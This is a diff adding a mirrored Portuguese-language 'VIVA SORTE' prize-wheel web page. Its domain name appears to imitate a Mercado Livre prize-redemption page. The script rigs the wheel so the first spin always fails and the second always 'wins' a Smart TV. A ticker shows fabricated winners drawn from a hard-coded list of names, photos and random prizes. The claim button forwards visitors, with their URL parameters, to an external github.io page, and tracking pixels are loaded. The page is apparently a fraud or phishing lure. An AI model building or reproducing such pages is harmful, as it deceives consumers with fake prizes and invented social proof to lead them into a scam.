@@ -1,0 +1,335 @@
+<!DOCTYPE html><html lang="pt-br"><!-- Mirrored from meclivreresgate.online/roleta/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 31 Mar 2025 11:32:14 GMT --><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>VIVA SORTE - Gire a Roleta!</title>
+  <link rel="icon" href="images/favicon.png">
+  <link rel="shortcut icon" href="images/favicon.png">
+  <link rel="stylesheet" href="css/all.css" crossorigin="anonymous">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <link rel="stylesheet" href="css/stylead8e.css">
+  <style>
+  @keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.3); }
+    100% { transform: scale(1); }
+  }
+</style>
+  <style>
+    /* Animação de pulsação para as chances */
+    .pulsating {
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.3); }
+      100% { transform: scale(1); }
+    }
+  </style>
+  <script src="js/jquery-3.0.0.slim.min.js"></script>
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/confetti.browser.min.js"></script>
+</head>
+<body>
+  <div id="loading-screen" style="display: none;">
+      <div class="spinner-loading"></div>
+  </div>
+
+<script src="../../cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+  <div id="page-content">
+    <section>
+      <h1 id="cta-text" style="color: white;">
+  Gire a <b>Roleta</b> para ganhar o seu <b>Mega Prêmio</b>!<br>
+</h1>
+
+      <div class="roulette">
+        <img src="responda.html" id="roleta1">
+        <div id="roleta2">
+          <img src="images/roletanova.png" class="spinner">
+        </div>
+        <img src="images/button-gire.png" id="roleta3" style="cursor: pointer;">
+      </div>
+      <div class="button-roulette">
+        <button id="button-cta" class="runSpin">        
+          GIRE PARA GANHAR
+        </button>
+      </div>
+    </section>
+  </div>
+
+  <div id="people" class="people">
+    <img src="images/man6.jpg" id="people-img" alt="">
+    <p style="text-align: center" id="people-p">João acabou de ganhar <b>75% de desconto</b>!</p>
+  </div>
+
+  <div id="overlay" class="overlay"></div>
+  <div id="popup-try-again" class="popup">
+    <div class="popup-content">
+      <h2>Uma pena!</h2>
+      <img src="images/sweat.png">
+      <p>Que pena...Mas você ainda tem mais <b class="text-success pulsating" style="color: green!important; font-size: 22px; animation: pulse 1.5s infinite; display: inline-block;"> 01 </b> chance extra. Boa sorte!</p>
+      <button id="try-again-button">Tentar Novamente</button>
+    </div>
+  </div>
+  <div id="popup" class="popup">
+    <div class="popup-content">
+      <h2>Parabéns!</h2>
+      <img src="images/star-struck.png">
+      <p>Você acaba de ganhar uma <b class="text-success pulsating" style="color: green!important;">Smart TV de 60 polegadas 4K</b></p>
+      <button id="resgatar-premio" href="responda.html">Resgatar seu Prêmio</button>
+    </div>
+    <audio id="confetti-audio" src="media/"></audio>
+    <audio id="roleta-audio" src="media/roleta.mp3"></audio>
+  </div>
+
+  <script>
+    let attempt = 0;
+
+    const animateSpin = () => {
+      const roleta2 = document.querySelector('#roleta2');
+      const roleta2Img = document.querySelector('#roleta2 img');
+      const buttonCta = document.getElementById('button-cta');
+      const confettiAudio = document.getElementById('confetti-audio');
+      const roletaAudio = document.getElementById('roleta-audio');
+      const ctaText = document.getElementById('cta-text');
+      const chanceText = document.getElementById('chance');
+
+      if (roleta2) {
+        roleta2Img.classList.remove('spinner');
+        buttonCta.style.display = 'none';
+
+        // Tocar o som da roleta no início
+        roletaAudio.currentTime = 0;
+        roletaAudio.play();
+
+        if (attempt === 0) {
+          const animatedClass = 'wheel__spinner_animated_retry_then_win';
+          roleta2.classList.add(animatedClass);
+
+          setTimeout(() => {
+            roletaAudio.pause();
+            const overlay = document.getElementById('overlay');
+            const tryAgainPopup = document.getElementById('popup-try-again');
+            overlay.style.display = 'block';
+            tryAgainPopup.style.display = 'block';
+
+            // Atualizar o texto para chance extra
+
+          }, 10000);
+        } else {
+          const animatedClass = 'wheel__spinner_animated';
+          roleta2.classList.add(animatedClass);
+
+          setTimeout(() => {
+            roletaAudio.pause();
+            confetti({
+              particleCount: 100,
+              spread: 70,
+              origin: { y: 0.6 }
+            });
+            confettiAudio.play();
+
+            const overlay = document.getElementById('overlay');
+            const popup = document.getElementById('popup');
+            overlay.style.display = 'block';
+            popup.style.display = 'block';
+
+            buttonCta.classList.add('hide-me');
+          }, 10000);
+        }
+      }
+    };
+
+    const addSpinAnimation = (element) => {
+      element.addEventListener('click', () => {
+        animateSpin();
+        attempt++;
+      });
+    };
+
+    document.querySelectorAll('.runSpin').forEach(addSpinAnimation);
+
+    document.getElementById('roleta3').addEventListener('click', () => {
+      animateSpin();
+      attempt++;
+    });
+
+    document.getElementById('try-again-button').addEventListener('click', () => {
+      const overlay = document.getElementById('overlay');
+      const tryAgainPopup = document.getElementById('popup-try-again');
+      overlay.style.display = 'none';
+      tryAgainPopup.style.display = 'none';
+      const roleta2 = document.querySelector('#roleta2');
+      roleta2.classList.remove('wheel__spinner_animated_retry_then_win');
+      const buttonCta = document.getElementById('button-cta');
+      buttonCta.style.display = 'block';
+    });
+
+    (() => {
+  const premios = [
+    'Mil Reais',
+    'Carro 0km',
+    '12 Mil Reais',
+    '2 iPhones 16 Pro Max',
+    '15 Mil Reais'
+  ];
+
+  const frases = [
+    {
+      nome: 'Pedro Oliveira',
+      imgSrc: 'https://i.postimg.cc/RhB8zCK5/24.jpg',
+    },
+    {
+      nome: 'Ana Alves',
+      imgSrc: 'https://i.postimg.cc/prw31XTF/2.jpg',
+    },
+    {
+      nome: 'Fernanda Santos',
+      imgSrc: 'https://i.postimg.cc/X7FvNr9t/3.jpg',
+    },
+    {
+      nome: 'Bruno Souza',
+      imgSrc: 'https://i.postimg.cc/2ynfYBgw/5.jpg',
+    },
+    {
+      nome: 'Fabrício Costa',
+      imgSrc: 'https://i.postimg.cc/kXrTRHtD/6.jpg',
+    },
+    {
+      nome: 'Juliana Lima',
+      imgSrc: 'https://i.postimg.cc/0ynPrDjX/4.jpg',
+    },
+    {
+      nome: 'Yasmin Araújo',
+      imgSrc: 'https://i.postimg.cc/9XNrx3BF/10.jpg',
+    },
+    {
+      nome: 'Lucilene Silva',
+      imgSrc: 'https://i.postimg.cc/x8Wj92sv/11.jpg',
+    },
+    {
+      nome: 'Everaldo Rocha',
+      imgSrc: 'https://i.postimg.cc/nhFYvfVV/7.jpg',
+    },
+    {
+      nome: 'Oswaldo Carvalho',
+      imgSrc: 'https://i.postimg.cc/cHSQ4pzN/9.jpg',
+    },
+    {
+      nome: 'João Pereira',
+      imgSrc: 'https://i.postimg.cc/W3wf26XX/14.jpg',
+    },
+    {
+      nome: 'Ariadiny Gomes',
+      imgSrc: 'https://i.postimg.cc/xTMNqxKf/12.jpg',
+    },
+    {
+      nome: 'Carla Ferreira',
+      imgSrc: 'https://i.postimg.cc/qq8BBFWW/13.jpg',
+    },
+    {
+      nome: 'Gabriela Vieira',
+      imgSrc: 'https://i.postimg.cc/MT9bPss2/15.jpg',
+    },
+    {
+      nome: 'Wellington Martins',
+      imgSrc: 'https://i.postimg.cc/vmBW17Y0/16.jpg',
+    },
+    {
+      nome: 'Iago Barbosa',
+      imgSrc: 'https://i.postimg.cc/rwgHX9Zj/17.jpg',
+    },
+    {
+      nome: 'Maicon Ramos',
+      imgSrc: 'https://i.postimg.cc/0NFcPXYY/18.jpg',
+    },
+    {
+      nome: 'Vitória Castro',
+      imgSrc: 'https://i.postimg.cc/VkSKpcMf/19.jpg',
+    },
+    {
+      nome: 'Matheus Santos',
+      imgSrc: 'https://i.postimg.cc/qvXNkN2j/20.jpg',
+    },
+    {
+      nome: 'Marta Rocha',
+      imgSrc: 'https://i.postimg.cc/N0Fdh9nr/23.jpg',
+    },
+    {
+      nome: 'Geraldo Nascimento',
+      imgSrc: 'https://i.postimg.cc/25gVzM07/21.jpg',
+    },
+    {
+      nome: 'Daniel Ribeiro',
+      imgSrc: 'https://i.postimg.cc/ZK0tcnb0/22.jpg',
+    },
+  ];
+
+  window.addEventListener('DOMContentLoaded', () => {
+    const contDiv = document.getElementById('people');
+    const peopleFrase = document.getElementById('people-p');
+    const peopleImg = document.querySelector('#people-img');
+    setInterval(() => {
+      const randFrase = frases[Math.floor(Math.random() * frases.length)];
+      const premioAleatorio = premios[Math.floor(Math.random() * premios.length)];
+
+      const frase = `${randFrase.nome} acabou de ganhar <b>${premioAleatorio}</b>!`;
+
+      peopleFrase.innerHTML = frase;
+      peopleImg.src = randFrase.imgSrc;
+
+      contDiv.classList.toggle('display-off');
+      contDiv.classList.remove('slide-animation');
+      setTimeout(() => {
+        contDiv.classList.toggle('display-off');
+        contDiv.classList.add('slide-animation');
+      }, 20);
+    }, 4000);
+  });
+})();
+
+
+    const getQueryParams = () => {
+      const params = new URLSearchParams(window.location.search);
+      return params.toString();
+    };
+
+    document.getElementById('resgatar-premio').addEventListener('click', () => {
+      const queryParams = getQueryParams();
+      const baseUrl = 'https://vivasortehoje.github.io/premio/';
+      const redirectUrl = queryParams ? `${baseUrl}?${queryParams}` : baseUrl;
+      window.location.href = redirectUrl;
+    });
+
+    window.addEventListener('load', function() {
+      const loadingScreen = document.getElementById('loading-screen');
+      loadingScreen.style.display = 'none';
+    });
+  </script>
+
+  <script src="js/jstools.js"></script>
+
+<script src="js/latest.js" async="" defer=""></script>
+
+<script>
+  window.pixelId = "67f601eec3792861e96e7816";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.pixelId = "67cfdade0612919cde5f08ad";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+
+</body><!-- Mirrored from meclivreresgate.online/roleta/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 31 Mar 2025 11:32:19 GMT --></html>
